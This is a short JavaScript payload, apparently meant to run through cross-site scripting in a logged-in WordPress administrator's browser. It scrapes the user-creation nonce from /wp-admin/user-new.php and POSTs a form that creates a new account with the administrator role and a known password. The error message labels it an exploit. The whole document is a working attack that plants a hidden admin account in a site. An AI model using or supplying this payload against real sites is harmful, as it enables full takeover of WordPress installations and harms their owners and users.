// 1. Define the new user details
const username = 'security_auditor';
const email = 'audit@example.com';
const password = 'Password123!'; // Use a strong password for testing

// 2. Fetch the 'user-new.php' page to grab the security nonce
fetch('/wp-admin/user-new.php')
    .then(response => response.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        
        // Find the _wpnonce_create-user nonce
        const nonce = doc.querySelector('#_wpnonce_create-user').value;

        // 3. Prepare the form data to create the admin
        const formData = new FormData();
        formData.append('action', 'createuser');
        formData.append('_wpnonce_create-user', nonce);
        formData.append('_wp_http_referer', '/wp-admin/user-new.php');
        formData.append('user_login', username);
        formData.append('email', email);
        formData.append('first_name', 'Security');
        formData.append('last_name', 'Auditor');
        formData.append('pass1', password);
        formData.append('pass2', password);
        formData.append('role', 'administrator'); // The critical part
        formData.append('createuser', 'Add New User');

        // 4. Send the request to create the user
        return fetch('/wp-admin/user-new.php', {
            method: 'POST',
            body: formData
        });
    })
    .then(() => {
        console.log('Admin user creation request sent successfully.');
    })
    .catch(err => console.error('Exploit failed:', err));
